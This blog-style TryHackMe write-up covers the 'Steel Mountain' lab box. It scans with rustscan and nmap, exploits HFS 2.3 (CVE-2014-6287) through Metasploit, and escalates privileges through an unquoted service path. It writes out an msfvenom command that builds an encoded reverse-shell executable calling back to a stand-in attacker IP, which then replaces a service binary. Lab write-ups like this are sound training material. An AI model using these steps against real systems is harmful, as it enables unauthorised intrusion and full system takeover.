---
title: "TryHackMe - Steel Mountain"
date: 2022-05-03
lastmod: 2022-05-03
author: "Kurrupt68"
description: "Hack into a Mr.Robot themed Windows machine."
tags: ["tryhackme", "CVE", "metasploit", "windows"]
categories: ["writeup", "tryhackme"]
---

![Header image](/steelmountain.jpeg)
Hack into a Mr.Robot themed Windows machine.

Another day to root a box let's get to it.

## Enumeration

Started with rustscan to get a list of open ports and then pass the ports to a nmap command, chose rustscan for it's amazing speed.

```console
 ⚡ root@kali ❯ rustscan 10.10.63.218

     _____           _    _____                 
    |  __ \         | |  / ____|                
    | |__) |   _ ___| |_| (___   ___ __ _ _ __  
    |  _  / | | / __| __|\___ \ / __/ _` | '_ \ 
    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
    Faster nmap scanning with rust. 
 Automated Decryption Tool - https://github.com/ciphey/ciphey 
 Creator https://github.com/brandonskerritt
49152 open
49153 open
49154 open
3389 open
80 open
445 open
53730 open
5723 open
5985 open
6100 open
```

Once completed a nmap scan starts and scans the open ports to discover the servicees running on them.

```console
Starting nmap -A -p ["445", "3389", "5985", "8080", "27976", "47001", "49152", "49153", "49154", "49170"] -vvv 10.10.63.218 
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-05-01T11:43:39
| Not valid after:  2022-10-31T11:43:39
| MD5:   6533 0f18 5282 3036 fa38 ad7a d2b2 cad3
| SHA-1: a95e cc83 6d92 5b8a 9c23 0ce9 078e 8a1b 8780 3e4b
|_ssl-date: 2022-05-02T11:46:52+00:00; +58s from scanner time.
5985/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
Uptime guess: 0.003 days (since Mon May  2 05:41:53 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 57s, deviation: 0s, median: 57s
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:77:d7:db:b4:9d (unknown)
| Names:
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   STEELMOUNTAIN<20>    Flags: <unique><active>
| Statistics:
|   02 77 d7 db b4 9d 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35662/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 34211/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 42866/udp): CLEAN (Failed to receive data)
|   Check 4 (port 58184/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-02T11:46:45
|_  start_date: 2022-05-02T11:43:28
```

From the results above we see that there is a web server on port 80, browsing to http://IP-address:80/ there's an image of the employee of the month, whose name can be seen by viewing the page source the name is the filename of the image.

![](/empl.png)

## Exploitation

From the scan above there's a web service running on port 8080 browsing to http://IP-ADRESS:8080/

![](/hfs.png)

HttpFile Server 2.3 server running, a quick google-fu shows that this server is vulnearable to CVE-2014-6287 and there are multiple exploits publicly available,running searchsploit shows there's a metasploit module for this exploit.

![](/searchsploit.png)

Starting up msfconsole and loading the exploit **windows/http/rejetto_hfs_exec**
and then properly setting the options needed for the exploit to run.

![](/sm7.png)

After running the exploit, got dropped into a meterpreter shell and navigating to the user directory to get the user flag.

![](/user-flag.png)

## Priviledge Escalation

For priviledge escalation, I uploaded a copy of winpeas.exe to the box using meterpreter.

```console
meterpreter > upload ~/Tools/winPEAS.exe 
[*] uploading  : /root/Tools/winPEAS.exe -> winPEAS.exe
[*] Uploaded 1.85 MiB of 1.85 MiB (100.0%): /root/Tools/winPEAS.exe -> winPEAS.exe
[*] uploaded   : /root/Tools/winPEAS.exe -> winPEAS.exe
```

<img src="/win.png"/>

Running winPEAS from the command line with the log option to save the output to out.txt and then downloading the file makes it easier to analyse results on my attacking machine.Of the numerous results from winpeas one that sticks out is a  unquoted service path vulnerability in one of the installed applications.

![](/adsc9.png)

#### What is an unquoted service path vulnerability?

> When a service is created whose executable path contains spaces and isn't enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
> — <cite> Sumit Verma</cite>

The directory to the applictation is writeable so we can overwrite the application with a malicious one and restart the service which should run our program and give us SYSTEM priviledges.Using msfvenom we generate a executable that's a reverse shell.

```console
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Uploading the malicious executable to the box using meterpreter.

<img src="/adsc2.png"/>

And then setting up our netcat listener before restarting the services to catch our shell, restarting the service using the sc command in the system shell does the trick and ez we now have SYSTEM privileges!.

<img src="/whoami.png"/>

## Conclusion

Steel Mountain is another easy decent box that resembles a real life scenario which is great because it helps you prepare for vulnerablities you might come across on an engagement bonus points for the Mr.Robot Theme.
